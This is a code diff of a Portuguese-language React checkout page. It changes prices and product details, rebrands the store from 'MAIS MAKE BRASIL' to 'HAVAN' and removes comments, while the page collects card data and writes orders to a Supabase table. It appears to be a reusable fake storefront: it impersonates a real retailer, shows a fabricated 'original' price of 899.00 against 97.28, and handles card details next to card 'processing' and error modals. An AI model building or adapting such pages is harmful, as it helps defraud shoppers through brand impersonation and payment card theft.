@@ -33,7 +33,7 @@ const Checkout: React.FC = () => {
   const [isCouponDrawerOpen, setIsCouponDrawerOpen] = useState(false);
   const [orderNote, setOrderNote] = useState("");
   const [quantity, setQuantity] = useState(1);
-  const [selectedVar, setSelectedVar] = useState("SEM faixa e polvo");
+  const [selectedVar, setSelectedVar] = useState("Padrão");
   const [couponAmount, setCouponAmount] = useState(5);
   const [cardData, setCardData] = useState<any>(null);
   const [addressData, setAddressData] = useState<any>(null);
@@ -88,8 +88,8 @@ const Checkout: React.FC = () => {
 
   if (!product) return null;
 
-  const unitPrice = 47.00;
-  const originalPrice = 249.00;
+  const unitPrice = 97.28;
+  const originalPrice = 899.00;
   const subtotal = unitPrice * quantity;
   const originalSubtotal = originalPrice * quantity;
   const productDiscount = originalSubtotal - subtotal;
@@ -104,7 +104,6 @@ const Checkout: React.FC = () => {
       return;
     }
 
-    // Salva o pedido vinculando tudo no banco
     try {
       await supabase.from('orders').insert([{
         product_title: product?.title,
@@ -146,7 +145,6 @@ const Checkout: React.FC = () => {
 
   return (
     <div className="min-h-screen bg-[#F8F8F8] pb-[130px] font-sans">
-      {/* Modais de Processamento e Erro */}
       {isProcessingCard && (
         <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6 backdrop-blur-sm">
           <div className="bg-white rounded-2xl p-8 flex flex-col items-center space-y-4 w-full max-w-[300px]">
@@ -180,7 +178,6 @@ const Checkout: React.FC = () => {
         </div>
       )}
 
-      {/* Header */}
       <div className="bg-white sticky top-0 z-50 border-b h-12 flex items-center px-4">
         <button onClick={() => navigate(-1)} className="p-2 -ml-2">
           <ArrowLeft size={24} className="text-gray-900" />
@@ -189,7 +186,6 @@ const Checkout: React.FC = () => {
       </div>
 
       <div className="max-w-[600px] mx-auto">
-        {/* Endereço */}
         <div 
           className="bg-white p-4 flex items-center justify-between border-b cursor-pointer" 
           onClick={() => navigate('/adicionar-endereco', { state: location.state })}
@@ -206,10 +202,9 @@ const Checkout: React.FC = () => {
           <ChevronRight size={20} className="text-gray-300" />
         </div>
 
-        {/* Produto */}
         <div className="bg-white mt-2.5 p-4">
           <div className="flex justify-between items-center mb-3">
-            <span className="text-[15px] font-bold text-gray-900 uppercase">MAIS MAKE BRASIL</span>
+            <span className="text-[15px] font-bold text-gray-900 uppercase">HAVAN</span>
             <button className="text-[13px] text-gray-400 flex items-center" onClick={() => setIsNoteDrawerOpen(true)}>
               {orderNote ? "Nota adicionada" : "Adicionar nota"} <ChevronRight size={16} className="ml-0.5" />
             </button>
@@ -222,7 +217,7 @@ const Checkout: React.FC = () => {
 
           <div className="flex space-x-3">
             <div className="w-[100px] h-[100px] bg-[#F8F8F8] rounded-lg overflow-hidden border p-1 shrink-0">
-              <img src={product.media[0].src} className="w-full h-full object-contain" />
+              <img src={product.media[1]?.src || product.media[0].src} className="w-full h-full object-contain" />
             </div>
             <div className="flex-grow space-y-1">
               <h4 className="text-[14px] font-bold text-gray-900 line-clamp-2 leading-tight">{product.title}</h4>
@@ -252,7 +247,6 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
-        {/* Cupom */}
         <div className="bg-white mt-2.5 p-4 flex items-center justify-between cursor-pointer" onClick={() => setIsCouponDrawerOpen(true)}>
           <div className="flex items-center space-x-3">
             <Ticket size={22} className="text-[#FF2C55]" />
@@ -264,7 +258,6 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
-        {/* Resumo Detalhado */}
         <div className="bg-white mt-2.5 p-4">
           <h3 className="text-[16px] font-bold text-gray-900 mb-5">Resumo do Pedido</h3>
           <div className="space-y-4">
@@ -303,7 +296,6 @@ const Checkout: React.FC = () => {
           </div>
         </div>
 
-        {/* Pagamento */}
         <div className="bg-white mt-2.5 p-4 space-y-6">
           <h3 className="text-[16px] font-bold text-gray-900">Forma de pagamento</h3>
           
@@ -345,7 +337,6 @@ const Checkout: React.FC = () => {
         </div>
       </div>
 
-      {/* Rodapé Fixo */}
       <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
         <div className="max-w-[600px] mx-auto">
           <div className="flex justify-between items-center mb-3 px-1">
